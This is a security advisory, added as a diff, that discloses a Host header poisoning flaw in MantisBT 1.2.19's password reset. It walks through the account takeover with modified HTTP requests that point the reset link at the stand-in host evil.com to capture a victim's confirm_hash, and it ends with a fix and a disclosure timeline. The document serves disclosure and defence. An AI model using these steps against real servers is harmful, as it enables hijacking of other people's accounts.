@@ -1,0 +1,86 @@
+# Exploit Title: MantisBT 1.2.19 - Host header attack vulnerability
+# Date: 07-09-2015
+# Exploit Author: Pier-Luc Maltais
+				  Centre opérationnel de sécurité informatique gouvernemental (COSIG)
+# Vendor Homepage: https://www.mantisbt.org/
+# Software Link: http://sourceforge.net/projects/mantisbt/files/mantis-stable/
+# Version: 1.2.19
+# Contact: https://twitter.com/plmaltais
+		   http://plmsecurity.net/mantis_host_header_attack
+
+==========================
+Vulnerability Description:
+==========================
+
+MantisBT 1.2.19 is vulnerable to an Host header attack that can
+be exploited by an unauthenticated user to hijack another user account.
+ 
+==================
+Technical Details:
+==================
+
+This exploit use the Host header attack to poison the link in the
+password reset mail. You need to know the victim username and 
+e-mail. You also need a remote host that you control to catch the 
+verification hash needed for password reset.
+
+1.  Access the password reset feature and fill the form with the
+    victim username and e-mail.
+
+    http://{VULNERABLE_MANTIS}/mantisbt/lost_pwd_page.php
+
+2.  Using an intercepting proxy like Burp, change the Host header 
+    with your evil host.
+
+    Original request :
+    
+    POST /mantisbt/lost_pwd_page.php HTTP/1.1
+    Host : {VULNERABLE_MANTIS}
+    [...]
+    
+    Modified request : 
+    
+    POST /mantisbt/lost_pwd_page.php HTTP/1.1
+    Host : evil.com
+    [...]
+    
+3.  When the user receive the e-mail, the link is poisoned with 
+    the evil host.
+
+    [...]
+    visit the following URL to change your password: 
+    http://evil.com/mantisbt/verify.php?id=1&confirm_hash=81ece020dfcd6d53e02c5323583cdead 
+    [...]
+    
+4.  Now, when the victim click on the link to reset his password,
+    his verification hash will be sent to our evil host. All we 
+    have to do is access the verify.php page with his hash, so
+    we can change his password and hijack his account.
+    
+    http://{VULNERABLE_MANTIS}/mantisbt/verify.php?id=1&confirm_hash=81ece020dfcd6d53e02c5323583cdead 
+ 
+=========
+Solution:
+=========
+
+Use 
+$_SERVER['SERVER_NAME'] (server controlled) 
+instead of 
+$_SERVER['HTTP_HOST'] (client controlled)
+ 
+====================
+Disclosure Timeline:
+====================
+
+16/02/2015 - Found the vulnerability
+17/02/2015 - Wrote this advisory
+17/02/2015 - Contacted developers on MantisBT forum
+18/02/2015 - Opened an issue in the bug tracker
+01/09/2015 - Still not patched, releasing this advisory.
+ 
+===========
+References:
+===========
+
+[1] http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+[2] http://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421
